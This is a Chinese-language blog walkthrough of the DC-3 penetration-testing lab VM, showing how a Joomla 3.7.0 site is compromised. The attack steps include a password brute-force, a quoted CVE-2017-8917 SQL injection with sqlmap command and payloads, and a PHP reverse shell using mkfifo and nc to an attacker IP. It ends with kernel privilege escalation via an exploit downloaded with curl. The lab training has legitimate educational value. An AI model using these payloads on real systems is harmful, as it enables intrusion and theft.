@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-noah.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-noah.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-noah.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"noahbox.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"buttons","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
+  </script>
+
+  <meta name="description" content="Walkthrough for DC-0312345678910111213DescriptionDC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.As with the previous DC releas">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Walkthrough for DC-03">
+<meta property="og:url" content="http://noahbox.github.io/2021/04/27/DC-03/index.html">
+<meta property="og:site_name" content="Noah&#39;s Box">
+<meta property="og:description" content="Walkthrough for DC-0312345678910111213DescriptionDC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.As with the previous DC releas">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/04/27/ZJhHIEODu6VzF1G.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/27/iKZyQVeHbBAa957.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/27/qELN7DJBFA21Yde.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/27/8lgoqPGyEdpc2sv.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/27/tpe4rglOVIETAif.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/27/5ULREazZiH6IeQb.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/27/fL2v6SbI53yj9KW.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/27/ajFsQBJcugK2X6k.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/27/6UrjLK5WwJCehib.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/27/lRWOZoqgaBPuSyr.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/27/gY8F7T2d3c4zJul.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/27/NCngLZ3REy96mih.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/27/cNJIkmrBVpiOZoA.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/27/f8Lv7kKGmo4l2H5.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/27/J6YbsaNfS7M3AxD.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/27/GaWUQvL3lneNDC4.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/27/Vt9wqPcnKGNpfEx.png">
+<meta property="article:published_time" content="2021-04-27T03:30:00.000Z">
+<meta property="article:modified_time" content="2025-02-23T10:00:42.708Z">
+<meta property="article:author" content="MasterNoah&#x2F;NoahTie">
+<meta property="article:tag" content="Pentest">
+<meta property="article:tag" content="DC">
+<meta property="article:tag" content="Walkthrough">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/04/27/ZJhHIEODu6VzF1G.png">
+
+<link rel="canonical" href="http://noahbox.github.io/2021/04/27/DC-03/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Walkthrough for DC-03 | Noah's Box</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Noah's Box" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Noah's Box</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Hell is Other People.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-guestbook">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言簿</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://noahbox.github.io/2021/04/27/DC-03/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="MasterNoah/NoahTie">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Noah's Box">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Walkthrough for DC-03
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-04-27 11:30:00" itemprop="dateCreated datePublished" datetime="2021-04-27T11:30:00+08:00">2021-04-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-02-23 18:00:42" itemprop="dateModified" datetime="2025-02-23T18:00:42+08:00">2025-02-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%B5%9B%E5%8D%9A%E4%BF%9D%E5%AE%89/" itemprop="url" rel="index"><span itemprop="name">赛博保安</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%B5%9B%E5%8D%9A%E4%BF%9D%E5%AE%89/Pentest/" itemprop="url" rel="index"><span itemprop="name">Pentest</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2021/04/27/DC-03/" class="post-meta-item leancloud_visitors" data-flag-title="Walkthrough for DC-03" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2021/04/27/DC-03/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/04/27/DC-03/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Walkthrough-for-DC-03"><a href="#Walkthrough-for-DC-03" class="headerlink" title="Walkthrough for DC-03"></a>Walkthrough for DC-03</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line"></span><br><span class="line">DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</span><br><span class="line"></span><br><span class="line">As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all.</span><br><span class="line"></span><br><span class="line">Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</span><br><span class="line"></span><br><span class="line">For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#x27;t give you the answer, instead, I&#x27;ll give you an idea about how to move forward.</span><br><span class="line"></span><br><span class="line">For those with experience doing CTF and Boot2Root challenges, this probably won&#x27;t take you long at all (in fact, it could take you less than 20 minutes easily).</span><br><span class="line"></span><br><span class="line">If that&#x27;s the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Nmap</span> scan report for <span class="number">192.168</span><span class="number">.21</span><span class="number">.161</span></span><br><span class="line"><span class="type">Host</span> is up (<span class="number">0.00053</span>s latency).</span><br><span class="line"><span class="type">Not</span> shown: <span class="number">999</span> closed ports</span><br><span class="line"><span class="type">PORT</span>   <span class="type">STATE</span> <span class="type">SERVICE</span> <span class="type">VERSION</span></span><br><span class="line"><span class="number">80</span>/tcp open  http    <span class="type">Apache</span> httpd <span class="number">2.4</span><span class="number">.18</span> ((<span class="type">Ubuntu</span>))</span><br><span class="line">|_http-generator: <span class="type">Joomla</span>! - <span class="type">Open</span> <span class="type">Source</span> <span class="type">Content</span> <span class="type">Management</span></span><br><span class="line">|_http-server-header: <span class="type">Apache</span>/<span class="number">2.4</span><span class="number">.18</span> (<span class="type">Ubuntu</span>)</span><br><span class="line">|_http-title: <span class="type">Home</span></span><br><span class="line"><span class="type">MAC</span> <span class="type">Address</span>: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="type">C9</span>:<span class="number">9</span>C:<span class="type">BD</span> (<span class="type">VMware</span>)</span><br><span class="line"><span class="type">Device</span> <span class="class"><span class="keyword">type</span>: general purpose</span></span><br><span class="line"><span class="type">Running</span>: <span class="type">Linux</span> <span class="number">3.</span><span class="type">X</span>|<span class="number">4.</span><span class="type">X</span></span><br><span class="line"><span class="type">OS</span> <span class="type">CPE</span>: cpe:/o:linux:linux_kernel:<span class="number">3</span> cpe:/o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line"><span class="type">OS</span> details: <span class="type">Linux</span> <span class="number">3.2</span> - <span class="number">4.9</span></span><br><span class="line"><span class="type">Network</span> <span class="type">Distance</span>: <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line"><span class="type">TRACEROUTE</span></span><br><span class="line"><span class="type">HOP</span> <span class="type">RTT</span>     <span class="type">ADDRESS</span></span><br><span class="line"><span class="number">1</span>   <span class="number">0.53</span> ms <span class="number">192.168</span><span class="number">.21</span><span class="number">.161</span></span><br></pre></td></tr></table></figure>
+
+<p>获取到以下信息：</p>
+<ul>
+<li>靶机80端口开放http服务，使用了Joomla CMS</li>
+</ul>
+<h3 id="AWVS扫描"><a href="#AWVS扫描" class="headerlink" title="AWVS扫描"></a>AWVS扫描</h3><p><img src="https://i.loli.net/2021/04/27/ZJhHIEODu6VzF1G.png" alt="image-20210426154257943"></p>
+<p>确定了Joomla的版本为3.7.0。</p>
+<p><img src="https://i.loli.net/2021/04/27/iKZyQVeHbBAa957.png" alt="image-20210426155138629"></p>
+<p><code>/administrator</code>、<code>/component</code>、<code>/media</code>和<code>/templates</code>目录存在目录遍历。</p>
+<p><img src="https://i.loli.net/2021/04/27/qELN7DJBFA21Yde.png" alt="image-20210426155409015"></p>
+<p>发现了疑似管理员登陆的页面<code>/administrator</code>。</p>
+<h3 id="JoomScan"><a href="#JoomScan" class="headerlink" title="JoomScan"></a>JoomScan</h3><p><img src="https://i.loli.net/2021/04/27/8lgoqPGyEdpc2sv.png" alt="image-20210426161224727"></p>
+<p>没有发现什么特别的东西。</p>
+<h2 id="Joomla管理员权限获取"><a href="#Joomla管理员权限获取" class="headerlink" title="Joomla管理员权限获取"></a>Joomla管理员权限获取</h2><p>访问Joomla首页。</p>
+<h3 id="世界线一"><a href="#世界线一" class="headerlink" title="世界线一"></a>世界线一</h3><p>burp抓包发现明文密码传输，尝试爆破密码。</p>
+<p><img src="https://i.loli.net/2021/04/27/tpe4rglOVIETAif.png" alt="image-20210426164845316"></p>
+<p><img src="https://i.loli.net/2021/04/27/5ULREazZiH6IeQb.png" alt="image-20210426205738395"></p>
+<p>爆出来了管理员密码。</p>
+<h3 id="世界线二"><a href="#世界线二" class="headerlink" title="世界线二"></a>世界线二</h3><p>在metasploit中搜索joomla 3.7.0的利用方式。</p>
+<p><img src="https://i.loli.net/2021/04/27/fL2v6SbI53yj9KW.png" alt="image-20210426204739616"></p>
+<p>搜到了一个SQL注入和一个XSS，尝试利用SQL注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: Joomla 3.7.0 - Sql Injection</span><br><span class="line"># Date: 05-19-2017</span><br><span class="line"># Exploit Author: Mateus Lino</span><br><span class="line"># Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</span><br><span class="line"># Vendor Homepage: https://www.joomla.org/</span><br><span class="line"># Version: = 3.7.0</span><br><span class="line"># Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</span><br><span class="line"># CVE : - CVE-2017-8917</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Using Sqlmap: </span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Parameter: list[fullordering] (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (DUAL)</span><br><span class="line">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)</span><br><span class="line">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)</span><br><span class="line">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)</span><br></pre></td></tr></table></figure>
+
+<p>使用给出的payload使用nmap进行注入。</p>
+<p><img src="https://i.loli.net/2021/04/27/ajFsQBJcugK2X6k.png" alt="image-20210426205927469"></p>
+<p><img src="https://i.loli.net/2021/04/27/6UrjLK5WwJCehib.png" alt="image-20210426210018430"></p>
+<p><img src="https://i.loli.net/2021/04/27/lRWOZoqgaBPuSyr.png" alt="image-20210426210230719"></p>
+<p><img src="https://i.loli.net/2021/04/27/gY8F7T2d3c4zJul.png" alt="image-20210426210316849"></p>
+<p>拿到了使用bcrypt加密的密码，使用Hashcat爆破。</p>
+<blockquote>
+<p><strong>Bcrypt加密算法</strong></p>
+<p><img src="https://i.loli.net/2021/04/27/NCngLZ3REy96mih.png" alt="img"></p>
+<ol>
+<li>Rounds: 正数，代表hash杂凑次数，数值越高越安全，默认10次。</li>
+<li>Salt: 盐，一个128bits随机字符串，22字符</li>
+<li>Hash: 经过明文密码password和盐salt进行hash，个人的理解是默认10次下 ，循环加盐hash10次，得到Hash</li>
+</ol>
+</blockquote>
+<p><img src="https://i.loli.net/2021/04/27/cNJIkmrBVpiOZoA.png" alt="image-20210426210905268"></p>
+<h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>进入网站后台，学习了一下joomla的页面管理。个人理解joomla的页面显示依托于template，真正的网页源代码保存在<code>/administrator/templates/[template name]</code>目录下。</p>
+<p>在后台中进入<code>Templates -&gt; Templates -&gt; Beez3 Details and Files</code>页面，上传一个反弹shell。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    system(<span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.21.158 5555 &gt;/tmp/f&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>在linux上使用<code>nc -nlvp 5555</code>接收回传数据。</p>
+<p>这里也可以上传一句话shell，用蚁剑连接进行终端模拟。</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>上传了Linux_Exploit_Suggester脚本，没有爆出来可利用的漏洞。</p>
+<p>也没有找到可以利用的SUID，也没有配置不当的sudo权限。</p>
+<p>在metasploit中查找可利用的EXP。</p>
+<p><code>compgen -u</code>指令查看全部用户，发现了一个叫dc3的用户，尝试使用之前得到的密码<code>snoopy</code>进行登录，认证失败。</p>
+<p>突然想起来一个场外因素，先前的靶机都是Debian系统，而这次使用了Ubuntu，或许有Ubuntu的CVE可用。在网上搜索了一下，Ubuntu 16.04有一个本地提权漏洞。在shell中使用<code>lsb_release -a</code>和<code>uname -a</code>命令查看系统版本和内核版本，发现Ubuntu 16.04 内核 4.4.0 正好满足漏洞发生条件。</p>
+<p><img src="https://i.loli.net/2021/04/27/f8Lv7kKGmo4l2H5.png" alt="image-20210426231218340"></p>
+<p>但是网上找到的EXP都跑不通，于是在metasploit中搜索，发现了相同的漏洞，使用metasploit中提供的EXP。</p>
+<p><img src="https://i.loli.net/2021/04/27/J6YbsaNfS7M3AxD.png" alt="image-20210426232751089"></p>
+<p>通过python起一个http服务，在shell中通过curl将漏洞利用脚本下载到服务器上，编译运行。</p>
+<p><img src="https://i.loli.net/2021/04/27/GaWUQvL3lneNDC4.png" alt="image-20210426232326183"></p>
+<p>因为该漏洞利用是对内存的利用，当进行一次提权之后，被利用的内存位置中的数据就会发生改变，导致无法进行第二次提权。因此，服务器每次重启只能使用该方式进行一次提权，提权后应当尽快进行权限维持。</p>
+<p><img src="https://i.loli.net/2021/04/27/Vt9wqPcnKGNpfEx.png" alt="image-20210426232644658"></p>
+<p>在<code>/root</code>目录下读取到flag。</p>
+
+    </div>
+
+    
+    
+    
+      <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #66ccff;font-size:14px;">-EOF-</div>
+    
+</div>
+      
+      </div>
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Pentest/" rel="tag"># Pentest</a>
+              <a href="/tags/DC/" rel="tag"># DC</a>
+              <a href="/tags/Walkthrough/" rel="tag"># Walkthrough</a>
+          </div>
+
+        
+  <div class="post-widgets">
+    <div class="wp_rating">
+      <div id="wpac-rating"></div>
+    </div>
+  </div>
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/24/DC-02/" rel="prev" title="Walkthrough for DC-02">
+      <i class="fa fa-chevron-left"></i> Walkthrough for DC-02
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/06/22/%E8%A1%80%E6%B0%B4/" rel="next" title="【COC剧本】【古城事件簿④】血水">
+      【COC剧本】【古城事件簿④】血水 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Walkthrough-for-DC-03"><span class="nav-number">1.</span> <span class="nav-text">Walkthrough for DC-03</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap"><span class="nav-number">1.1.1.</span> <span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AWVS%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.2.</span> <span class="nav-text">AWVS扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JoomScan"><span class="nav-number">1.1.3.</span> <span class="nav-text">JoomScan</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Joomla%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E8%8E%B7%E5%8F%96"><span class="nav-number">1.2.</span> <span class="nav-text">Joomla管理员权限获取</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%96%E7%95%8C%E7%BA%BF%E4%B8%80"><span class="nav-number">1.2.1.</span> <span class="nav-text">世界线一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%96%E7%95%8C%E7%BA%BF%E4%BA%8C"><span class="nav-number">1.2.2.</span> <span class="nav-text">世界线二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96shell"><span class="nav-number">1.3.</span> <span class="nav-text">获取shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">1.4.</span> <span class="nav-text">提权</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="MasterNoah/NoahTie"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">MasterNoah/NoahTie</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/noahbox" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;noahbox" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:noahtie@duck.com" title="E-Mail → mailto:noahtie@duck.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fas fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
